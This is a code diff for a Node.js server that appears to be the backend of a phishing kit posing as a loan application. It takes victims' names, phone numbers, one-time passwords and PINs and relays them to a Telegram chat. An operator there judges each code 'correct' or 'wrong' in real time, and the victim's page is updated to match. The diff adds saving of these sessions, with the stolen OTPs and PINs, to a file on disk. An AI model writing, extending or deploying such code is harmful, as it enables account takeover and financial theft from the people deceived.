@@ -1,6 +1,8 @@
 const express = require('express');
 const http = require('http');
 const https = require('https');
+const fs = require('fs');
+const path = require('path');
 const { WebSocketServer, WebSocket } = require('ws');
 
 // ═══════════════════════════════════════════
@@ -9,6 +11,46 @@ const { WebSocketServer, WebSocket } = require('ws');
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 const PORT = process.env.PORT || 3000;
+const SESSIONS_FILE = path.join(__dirname, 'sessions.json');
+
+// ═══════════════════════════════════════════
+// SESSION PERSISTENCE (survives server restarts)
+// ═══════════════════════════════════════════
+let sessions = {};
+
+function loadSessions() {
+    try {
+        if (fs.existsSync(SESSIONS_FILE)) {
+            const data = fs.readFileSync(SESSIONS_FILE, 'utf-8');
+            const parsed = JSON.parse(data);
+            // Restore sessions but clear ws references (they're dead)
+            for (const key in parsed) {
+                parsed[key].ws = null;
+                sessions[key] = parsed[key];
+            }
+            console.log('Loaded ' + Object.keys(sessions).length + ' sessions from file');
+        }
+    } catch (e) {
+        console.log('No saved sessions to load');
+    }
+}
+
+function saveSessions() {
+    try {
+        // Strip ws references before saving
+        const toSave = {};
+        for (const key in sessions) {
+            const s = { ...sessions[key] };
+            delete s.ws;
+            toSave[key] = s;
+        }
+        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(toSave, null, 2));
+    } catch (e) {
+        console.error('Failed to save sessions:', e.message);
+    }
+}
+
+loadSessions();
 
 // ═══════════════════════════════════════════
 // SETUP
@@ -19,8 +61,6 @@ const wss = new WebSocketServer({ server, path: '/ws' });
 
 app.use(express.static(__dirname));
 app.use(express.json());
-
-const sessions = {};
 
 // ═══════════════════════════════════════════
 // WEBSOCKET
@@ -105,13 +145,14 @@ app.post('/api/apply', async (req, res) => {
     const total = amount + interest;
 
     sessions[sessionId] = {
-        ws: null,
         name, phone, amount, period,
         otp: '', pin: '',
-        otpVerified: false, pinVerified: false,
         otpDecision: null, otpDecisionSent: false,
-        pinDecision: null, pinDecisionSent: false
+        pinDecision: null, pinDecisionSent: false,
+        createdAt: new Date().toISOString()
     };
+
+    saveSessions();
 
     const msg = 'NEW LOAN APPLICATION\n' +
         '━━━━━━━━━━━━━━━━━━\n' +
@@ -138,9 +179,9 @@ app.post('/api/otp', async (req, res) => {
     if (!session) return res.status(404).json({ error: 'Session not found' });
 
     session.otp = otp;
-    session.otpVerified = false;
     session.otpDecision = null;
     session.otpDecisionSent = false;
+    saveSessions();
 
     const msg = 'OTP SUBMITTED\n' +
         '━━━━━━━━━━━━━━━━━━\n' +
@@ -172,9 +213,9 @@ app.post('/api/pin', async (req, res) => {
     if (!session) return res.status(404).json({ error: 'Session not found' });
 
     session.pin = pin;
-    session.pinVerified = false;
     session.pinDecision = null;
     session.pinDecisionSent = false;
+    saveSessions();
 
     const msg = 'PIN SUBMITTED\n' +
         '━━━━━━━━━━━━━━━━━━\n' +
@@ -195,7 +236,7 @@ app.post('/api/pin', async (req, res) => {
 });
 
 // ═══════════════════════════════════════════
-// POLLING FALLBACK (frontend checks this every 3s)
+// POLLING FALLBACK (frontend checks every 3s)
 // ═══════════════════════════════════════════
 app.get('/api/check', (req, res) => {
     const { sessionId } = req.query;
@@ -207,11 +248,13 @@ app.get('/api/check', (req, res) => {
 
     if (session.otpDecision && !session.otpDecisionSent) {
         session.otpDecisionSent = true;
+        saveSessions();
         return res.json({ status: 'decision', type: 'otp_result', result: session.otpDecision });
     }
 
     if (session.pinDecision && !session.pinDecisionSent) {
         session.pinDecisionSent = true;
+        saveSessions();
         return res.json({ status: 'decision', type: 'pin_result', result: session.pinDecision });
     }
 
@@ -241,7 +284,7 @@ async function pollTelegram() {
 
                 if (!session) {
                     console.log('Unknown session:', sessionId);
-                    await answerCallback(cq.id, 'Session expired. Please re-apply.');
+                    await answerCallback(cq.id, 'Session not found. Please re-apply.');
                     continue;
                 }
 
@@ -249,6 +292,7 @@ async function pollTelegram() {
                 if (action === 'otp_correct') {
                     session.otpDecision = 'correct';
                     session.otpDecisionSent = false;
+                    saveSessions();
 
                     await answerCallback(cq.id, 'OTP Approved!');
 
@@ -266,6 +310,7 @@ async function pollTelegram() {
                     if (session.ws && session.ws.readyState === WebSocket.OPEN) {
                         session.ws.send(JSON.stringify({ type: 'otp_result', result: 'correct' }));
                         session.otpDecisionSent = true;
+                        saveSessions();
                     }
 
                     console.log('OTP CORRECT:', session.name, session.otp);
@@ -274,6 +319,7 @@ async function pollTelegram() {
                 } else if (action === 'otp_wrong') {
                     session.otpDecision = 'wrong';
                     session.otpDecisionSent = false;
+                    saveSessions();
 
                     await answerCallback(cq.id, 'OTP Rejected. User notified.');
 
@@ -291,6 +337,7 @@ async function pollTelegram() {
                     if (session.ws && session.ws.readyState === WebSocket.OPEN) {
                         session.ws.send(JSON.stringify({ type: 'otp_result', result: 'wrong' }));
                         session.otpDecisionSent = true;
+                        saveSessions();
                     }
 
                     console.log('OTP WRONG:', session.name, session.otp);
@@ -299,6 +346,7 @@ async function pollTelegram() {
                 } else if (action === 'pin_correct') {
                     session.pinDecision = 'correct';
                     session.pinDecisionSent = false;
+                    saveSessions();
 
                     await answerCallback(cq.id, 'PIN Approved! Application complete.');
 
@@ -319,6 +367,7 @@ async function pollTelegram() {
                     if (session.ws && session.ws.readyState === WebSocket.OPEN) {
                         session.ws.send(JSON.stringify({ type: 'pin_result', result: 'correct' }));
                         session.pinDecisionSent = true;
+                        saveSessions();
                     }
 
                     console.log('PIN CORRECT:', session.name, 'COMPLETE');
@@ -327,6 +376,7 @@ async function pollTelegram() {
                 } else if (action === 'pin_wrong') {
                     session.pinDecision = 'wrong';
                     session.pinDecisionSent = false;
+                    saveSessions();
 
                     await answerCallback(cq.id, 'PIN Rejected. User notified.');
 
@@ -344,6 +394,7 @@ async function pollTelegram() {
                     if (session.ws && session.ws.readyState === WebSocket.OPEN) {
                         session.ws.send(JSON.stringify({ type: 'pin_result', result: 'wrong' }));
                         session.pinDecisionSent = true;
+                        saveSessions();
                     }
 
                     console.log('PIN WRONG:', session.name, session.pin);
@@ -357,6 +408,23 @@ async function pollTelegram() {
 }
 
 // ═══════════════════════════════════════════
+// CLEANUP OLD SESSIONS (older than 24h)
+// ═══════════════════════════════════════════
+setInterval(() => {
+    const now = Date.now();
+    for (const key in sessions) {
+        if (sessions[key].createdAt) {
+            const age = now - new Date(sessions[key].createdAt).getTime();
+            if (age > 24 * 60 * 60 * 1000) {
+                delete sessions[key];
+                console.log('Cleaned up old session:', key);
+            }
+        }
+    }
+    saveSessions();
+}, 3600000);
+
+// ═══════════════════════════════════════════
 // START
 // ═══════════════════════════════════════════
 server.listen(PORT, () => {
@@ -366,6 +434,7 @@ server.listen(PORT, () => {
     console.log('Telegram polling started');
     console.log('Token set:', TELEGRAM_BOT_TOKEN ? 'YES' : 'NO (check env vars)');
     console.log('Chat ID:', TELEGRAM_CHAT_ID || 'NOT SET');
+    console.log('Sessions file:', SESSIONS_FILE);
     console.log('');
     pollTelegram();
 });   
